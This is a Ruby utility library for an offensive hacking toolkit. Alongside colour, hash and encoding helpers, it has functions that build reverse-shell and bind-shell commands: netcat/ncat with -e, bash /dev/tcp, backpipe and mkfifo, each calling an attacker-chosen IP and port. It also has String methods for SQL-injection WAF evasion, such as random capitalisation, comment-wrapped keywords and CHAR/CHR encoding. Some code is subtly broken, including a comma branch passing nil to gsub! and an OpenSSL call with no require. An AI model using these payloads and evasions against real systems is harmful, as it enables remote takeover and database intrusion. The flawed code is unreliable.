#Helpfull Functions to be used as Support to plugin and core development
require 'cgi'
require 'digest/md5'
require 'etc'
require 'fileutils'
require 'hpricot'
require 'nokogiri'
require 'resolv'

# ANSI color codes set in variables to make custom shit easier :)
RS="\033[0m"    # reset
HC="\033[1m"    # hicolor
UL="\033[4m"    # underline
INV="\033[7m"   # inverse background and foreground
FBLK="\033[30m" # foreground black
FRED="\033[31m" # foreground red
FGRN="\033[32m" # foreground green
FYEL="\033[33m" # foreground yellow
FBLE="\033[34m" # foreground blue
FMAG="\033[35m" # foreground magenta
FCYN="\033[36m" # foreground cyan
FWHT="\033[37m" # foreground white
BBLK="\033[40m" # background black
BRED="\033[41m" # background red
BGRN="\033[42m" # background green
BYEL="\033[43m" # background yellow
BBLE="\033[44m" # background blue
BMAG="\033[45m" # background magenta
BCYN="\033[46m" # background cyan
BWHT="\033[47m" # background white

def cls
	#Function to clear terminal
	if RUBY_PLATFORM =~ /win32/ 
		system('cls')
	else
		system('clear')
	end
end

def traverse(num)
	#Handy function to build a traversal path with ease (traverse(3) => ../../../)
	'../' * num.to_i
end

def randz(num)
	# Generate a random aplha string length of value of num
	(0...num).map{ ('a'..'z').to_a[rand(26)] }.join
end

def osuser
	#Find Current Logged In User Ruby Script Is Running As (handy for re-chmod'ing things and whatever else you might need it for...
	if RUBY_PLATFORM =~ /win32/
		ENV['USERNAME'] # Windows
	else
		ENV['USER']  #Unix
	end
end

def realuser
	#Find Current Logged In User (when they signed into box/system). Helps if user runs script via sudo.....
	Etc.getlogin
end

def osuid
	#UID for current user
	Process.uid
end

def oseuid
	#EUID for current user
	Process.euid
end

def md5(string)
	#Gnerate a MS5 Hash given string
	Digest::MD5.hexdigest(string)
end

def sha1(string)
	#Gnerate a SHA1 Hash given string
	OpenSSL::Digest::SHA1.hexdigest(string)
end

def joomla(string)
	#Gnerate a Joomla Hash given string
	salt = (0..32).map{ rand(36).to_s(36) }.join #Generate Salt for Joomla Hashing
	saltypass = Digest::MD5.hexdigest(string + salt)
	joomla = "#{saltypass}:#{salt}"
	return joomla
end

###############
# Payload Fun #
###############
def nc_rev(ip, port)
	#Return prepared Payload for Traditional NetCat
	if RUBY_PLATFORM =~ /win32/
		foo="nc -e cmd.exe #{ip} #{port}"
	else
		foo="nc -e /bin/sh #{ip} #{port}"
	end
	return foo
end

def nc_bind(port)
	#Return prepared Payload for Traditional NetCat
	if RUBY_PLATFORM =~ /win32/
		foo="nc -l #{port} -e cmd.exe"
	else
		foo="nc -l #{port} -e /bin/sh"
	end
	return foo
end

def ncat_rev(ip, port)
	#Return prepared Payload for NCAT
	#Return prepared Payload for Traditional NetCat
	if RUBY_PLATFORM =~ /win32/
		foo="ncat -e cmd.exe #{ip} #{port}"
	else
		foo="ncat -e /bin/sh #{ip} #{port}"
	end
	return foo
end

def ncat_bind(port)
	#Return prepared Payload for NCAT
	if RUBY_PLATFORM =~ /win32/
		foo="ncat -l #{port} -e cmd.exe"
	else
		foo="ncat -l #{port} -e /bin/sh"
	end
	return foo
end

def devtcp(ip, port)
	#Return prepared Payload for Bash /dev/tcp trick, no -e option ;)
	foo="/bin/bash -i > /dev/tcp/#{ip}/#{port} 0<&1 2>&1"
	return foo
end

def backpipe_rev(ip, port)
	#Return prepared Payload for Bash Backpipe trick, no -e option ;)
	foo="mknod backpipe p && nc #{ip} #{port} 0<backpipe | /bin/bash 1>backpipe"
	return foo
end

def mkfifo_rev(ip, port)
	#Return prepared Payload for mkfifo trick, no -e option ;)
	foo=randz(5)
	bar="mkfifo /tmp/#{foo} && cat /tmp/#{foo} | /bin/sh -i 2>&1 | nc #{ip} #{port} > /tmp/#{foo}"
	return bar
end
############### Payload Fun End ###############

class String
	def encode64
		#Base64 Encode String
		[self].pack("m")
	end

	def base64dec
		#Base64 Decode String
		unpack("m")[0]
	end

	#A Few adjustments to the String Class to make development easier where possible (common routines repeatedly used)
	def hexme
		#Convert String to HEX Value
		self.each_byte.map { |b| b.to_s(16) }.join
	end

	def dehexme
		#Convert String from HEX Value to Char Value
		self.scan(/../).map { |x| x.hex.chr }.join
	end

	def asciime
		#Convert Passed String into its equivelant in ascii code values; "hello".asciime => "104,101,108,108,111"
		foo=[]
		self.each_byte { |byte| foo << byte }
		foo.join(',')
	end

	def rot13
		#Simple rot13 Cipher using tr (rot13 is its own reverse, since shift is half the aplhabet, so no reverse function)
		self.tr("A-Za-z", "N-ZA-Mn-za-m")
	end

	def mysqlhex
		#Convert String to HEX Value with '0x' prefix for mysql friendliness
		foo='0x'
		foo += self.each_byte.map { |b| b.to_s(16) }.join
		return foo
	end

	def mysqlhexdecode
		#HEX Decoding of mysql hex '0x'
		self.sub('0x','').scan(/../).map { |x| x.hex.chr }.join
	end

	def mysqlchar
		# poop.mysqlchar => CHAR(112, 111, 111, 112)
		foo='CHAR('
		foo += self.asciime + ')'
		return foo
	end

	def mssqlchar
		# poop.mssqlchar => CHAR(112) + CHAR(111) + CHAR(111) + CHAR(112)
		foo=[]
		self.asciime.split(',').each {|chr| foo << "CHAR(#{chr})" }
		foo.join('+')
	end

	def oraclechar
		# poop.oraclechar => CHR(112) || CHR(111) || CHR(111) || CHR(112)
		foo=[]
		self.asciime.split(',').each {|chr| foo << "CHR(#{chr})" }
		foo.join('||')
	end

	def wafcap
		# Perform simple random capitlization on string for simple WAF bypass attempts (SELECT => selEct, CONCAT => CONcAt)
		while(true)
			foo=self.split('')
			bar=[]
			foo.each do |char|
				foobar=rand(2)
				if foobar.to_i == 0
					bar << char.upcase
				else
					bar << char.downcase
				end
			end
			check = bar.join
			if not check == self.upcase and not check == self.downcase
				return check
				break
			end
		end
	end

	def commoncomment
		#C Comment common keywords in SQLi
		#'select cast(something as CHAR) and union select from information_schema.tables or concat(you momma) and group_concat(yo daddy)'.commoncomment
		# => /*select*/ /*cast*/(something as CHAR) and /*union*/ /*select*/ from /*information_schema*/.tables or concat(you momma) and /*group_concat*/(yo daddy)
		if self =~ /(select)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(union)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(concat)/i and not self =~ /(group_concat)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(group_concat)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(information_schema)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(cast)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(convert)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(substring)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(sleep)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /(benchmark)/i
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		if self =~ /,/
			foo=$1
			self.gsub!(foo, "/*#{foo}*/")
		end
		return self
	end

	def space2comment
		self.split(' ').join('/**/')
	end

	def space2oa
		self.split(' ').join('%0A')
	end

	def urienc encoding=nil
		#URI Encode String
		begin
			CGI::escape self
		rescue ArgumentError => e
			if e.to_s == 'invalid byte sequence in UTF-8'
				encoding = 'binary' if encoding.nil?
				CGI::escape self.force_encoding(encoding)
			else
				raise e
			end
		end
	end

	def uridec
		#URI Decode String
		CGI::unescape self
	end
end
